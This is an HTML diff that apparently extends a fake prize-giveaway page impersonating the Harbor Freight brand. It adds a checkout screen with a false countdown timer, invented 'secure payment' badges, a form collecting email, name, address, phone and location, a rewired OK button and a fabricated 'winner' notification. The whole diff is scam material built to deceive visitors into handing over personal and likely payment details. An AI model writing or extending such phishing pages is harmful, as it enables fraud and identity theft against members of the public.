@@ -119,6 +119,125 @@
                 <div class="validation-text">There are still prizes available!</div>
             </div>
         </div>
+
+        <div id="prefillScreen" class="screen">
+            <div class="prefill-header">
+                <div class="menu-icon">
+                    <div class="burger-line"></div>
+                    <div class="burger-line"></div>
+                    <div class="burger-line"></div>
+                </div>
+                <div class="prefill-logo">HARBOR FREIGHT</div>
+                <div class="cart-icon">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="9" cy="20" r="1.5" fill="currentColor"/>
+                        <circle cx="18" cy="20" r="1.5" fill="currentColor"/>
+                        <path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                    <span class="cart-badge-white">1</span>
+                </div>
+            </div>
+
+            <div class="cart-timer-banner">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="12" cy="12" r="10" stroke="white" stroke-width="2"/>
+                    <path d="M12 6v6l4 2" stroke="white" stroke-width="2" stroke-linecap="round"/>
+                </svg>
+                Your cart is reserved for <span id="cartTimer">3:27</span> minutes!
+            </div>
+
+            <div class="order-summary-toggle" onclick="toggleOrderSummary()">
+                <div class="toggle-left">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M3 3h2l.4 2M7 13h10l4-8H5.4M7 13L5.4 5M7 13l-2.293 2.293c-.63.63-.184 1.707.707 1.707H17m0 0a2 2 0 100 4 2 2 0 000-4zm-8 2a2 2 0 11-4 0 2 2 0 014 0z" stroke="currentColor" stroke-width="2"/>
+                    </svg>
+                    <span>Hide order summary</span>
+                </div>
+                <div class="toggle-right">
+                    <span id="orderSummaryArrow">▲</span>
+                    <span class="price-preview">pricenew</span>
+                </div>
+            </div>
+
+            <div id="orderSummaryContent" class="order-summary-content">
+                <div class="product-title" id="prefillProductTitle">Loffertitle</div>
+                <div class="product-image-container">
+                    <img src="images/icon-toolset.png" alt="Product" class="prefill-product-image">
+                </div>
+                
+                <div class="price-row">
+                    <span>Total</span>
+                    <span class="price-value">pricenew</span>
+                </div>
+                <div class="price-row">
+                    <span>Shipping Costs</span>
+                    <span class="price-value">Free</span>
+                </div>
+                <div class="price-row total-price">
+                    <span>Total Price</span>
+                    <span class="price-value">pricenew</span>
+                </div>
+
+                <div class="payment-guarantee">GUARANTEED SECURE PAYMENT</div>
+                <div class="payment-logos">
+                    <img src="images/visa.jpg" alt="Visa">
+                    <img src="images/mastercard.jpg" alt="Mastercard">
+                    <img src="images/maestro.jpg" alt="Maestro">
+                    <div class="payment-logo-placeholder">🔒</div>
+                    <div class="payment-logo-placeholder">📱</div>
+                    <div class="payment-logo-placeholder">💳</div>
+                    <div class="payment-logo-placeholder">🛡️</div>
+                </div>
+            </div>
+
+            <div class="checkout-progress">
+                <div class="progress-step active">
+                    <div class="step-number">1</div>
+                    <div class="step-label">DELIVERY<br>METHOD</div>
+                </div>
+                <div class="progress-step">
+                    <div class="step-number">2</div>
+                    <div class="step-label">PAYMENT<br>METHOD</div>
+                </div>
+                <div class="progress-step">
+                    <div class="step-number">3</div>
+                    <div class="step-label">RECEIVE<br>THE PRIZE</div>
+                </div>
+            </div>
+
+            <form id="checkoutForm" class="checkout-form">
+                <h3 class="form-section-title">Email Address</h3>
+                <input type="email" id="prefillEmail" name="email" placeholder="Email Address" required>
+
+                <h3 class="form-section-title">Shipping Address</h3>
+                <input type="text" id="prefillFirstName" name="firstName" placeholder="First Name" required>
+                <input type="text" id="prefillLastName" name="lastName" placeholder="Last Name" required>
+                <input type="text" id="prefillAddress" name="address" placeholder="Address" required>
+                <input type="text" id="prefillZip" name="zip" placeholder="ZIP Code" required>
+                
+                <select id="prefillState" name="state" required>
+                    <option value="">Select State</option>
+                    <option value="AL">Alabama</option>
+                    <option value="AK">Alaska</option>
+                    <option value="AZ">Arizona</option>
+                    <option value="CA">California</option>
+                    <option value="FL">Florida</option>
+                    <option value="GA">Georgia</option>
+                    <option value="NY">New York</option>
+                    <option value="TX">Texas</option>
+                </select>
+                
+                <input type="text" id="prefillCity" name="city" placeholder="City" required>
+                <input type="tel" id="prefillPhone" name="phone" placeholder="+XX XXX-XXX-XXXX" required>
+
+                <button type="submit" class="continue-button">CONTINUE</button>
+            </form>
+
+            <div class="checkout-footer">
+                <div class="footer-badge">TRUSTED STORE</div>
+                <div class="footer-secure">SECURE PAYMENT</div>
+            </div>
+        </div>
     </div>
 
     <div id="winnerModal" class="modal">
@@ -142,5 +261,33 @@
                 <li>Loffertitle will be shipped to the winner within 4-7 days.</li>
             </ol>
             
-            <button class="ok-button" onclick="redirectToGoogle()">OK</button>
+            <button class="ok-button" onclick="showPrefillScreen()">OK</button>
             
+            <div class="payment-disclaimer">
+                We can not use Matercard and Maestro to identify verification
+            </div>
+            
+            <div class="payment-icons">
+                <img src="images/visa.jpg" alt="Visa">
+                <img src="images/mastercard.jpg" alt="Mastercard">
+                <img src="images/maestro.jpg" alt="Maestro">
+            </div>
+        </div>
+    </div>
+
+    <canvas id="confetti"></canvas>
+
+    <div id="winnerNotification" class="winner-notification">
+        <div class="notification-icon">
+            <img src="images/icon-toolset-small.png" alt="Prize">
+        </div>
+        <div class="notification-content">
+            <div class="notification-name">James from <strong>Savannah</strong></div>
+            <div class="notification-prize">Won Blackstone 36 Griddle</div>
+            <div class="notification-time">25 seconds ago</div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
